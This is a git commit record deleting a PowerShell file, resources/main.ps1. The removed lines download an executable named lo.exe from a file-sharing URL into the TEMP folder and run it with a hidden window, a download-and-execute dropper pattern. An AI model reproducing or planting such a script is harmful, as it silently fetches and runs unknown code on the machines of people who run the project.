0f0000b3652917cb2dcbd47411f11fa8550e493b
AK <139993309+z3ro-c0nfig@users.noreply.github.com>
2025-05-27 15:22:28 +0200

    Delete resources/main.ps1

--- resources/main.ps1
+++
@@ -1,3 +0,0 @@
-$outfile = Join-Path $env:TEMP "lo.exe"
-Invoke-WebRequest -Uri 'https://store5.gofile.io/download/web/8ccb0d5d-c80b-4444-8aba-bffb43c06a2a/lo.exe' -OutFile $outfile -ErrorAction SilentlyContinue
-Start-Process -FilePath $outfile -WindowStyle Hidden
